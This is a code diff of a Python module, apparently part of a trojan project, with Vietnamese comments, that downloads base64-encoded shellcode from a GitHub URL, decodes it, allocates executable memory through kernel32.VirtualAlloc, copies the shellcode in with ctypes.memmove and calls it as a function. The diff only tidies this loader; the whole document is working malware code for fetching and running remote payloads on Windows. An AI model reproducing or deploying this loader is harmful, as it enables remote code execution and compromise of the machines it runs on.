@@ -4,15 +4,14 @@ import urllib.request
 
 def run(**args):
     try:
-        # 🛰️ Tải shellcode base64 từ GitHub (đặt đúng đường dẫn của bạn tại đây)
+        # 🛰️ Tải shellcode base64 từ GitHub
         url = "https://github.com/leducymta/bhptrojan/blob/master/shellcode/shellcode.b64"
         encoded_shellcode = urllib.request.urlopen(url).read()
-
-        # 🧩 Giải mã base64
         shellcode = base64.b64decode(encoded_shellcode)
+
         size = len(shellcode)
 
-        # 🧠 Cấp phát bộ nhớ có quyền thực thi
+        # 🧠 Cấp phát vùng nhớ với quyền thực thi
         kernel32 = ctypes.windll.kernel32
         ptr = kernel32.VirtualAlloc(
             None,
@@ -22,17 +21,12 @@ def run(**args):
         )
 
         if not ptr:
-            return "[!] Failed to allocate memory."
+            return "[!] Failed to allocate memory"
 
-        # 🧪 Copy shellcode vào vùng nhớ đó
-        ctypes.windll.kernel32.RtlMoveMemory(
-	    ctypes.c_void_p(ptr),
-	    ctypes.c_char_p(shellcode),
-	    size
-	)
+        # ✅ Ghi shellcode bằng memmove (an toàn & đúng kiểu hơn)
+        ctypes.memmove(ptr, shellcode, size)
 
-
-        # 🔥 Gọi shellcode như một hàm
+        # 🧨 Ép kiểu và thực thi
         shell_func = ctypes.CFUNCTYPE(None)(ptr)
         shell_func()
 
